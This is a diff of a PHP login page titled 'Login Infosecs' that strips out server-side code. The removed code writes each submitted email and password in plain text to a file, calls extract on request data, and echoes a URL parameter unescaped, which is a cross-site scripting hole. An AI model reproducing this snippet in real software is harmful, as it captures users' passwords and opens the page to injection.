@@ -49,35 +49,16 @@
 </head>
 
 <body>
-
-     <form action="login.php" method="post">
-        <?php if (isset($_GET['error'])) { ?>
-
-            <p class="error"><?php echo $_GET['error']; ?></p>
-            <?php
-            extract($_REQUEST);
-            $file=fopen("form.txt", "a")
-
-            fwrite($file, "email :");
-            fwrite($file, $email . "\n");
-
-            fwrite($file, "password :");
-            fwrite($file, $password . "\n");
-
-            fclose($file);
-            ?>
-        <?php } ?>
-
-        <center> <h1> Login Infosecs </h1> </center>
-        <div class="container"> 
+    <div class="container">
+        <form action="">
+            <center> <h1> Login Infosecs </h1> </center> 
             <label>Username : </label> 
             <input type="email" placeholder="Enter Email" name="email" required>
             <label>Password : </label> 
             <input type="password" placeholder="Enter Password" name="password" required>
-            <button>Login</button> 
-        </div> 
-     </form>
+            <button>Login</button>  
+        </form>
+    </div>
 
 </body>
-
 </html>
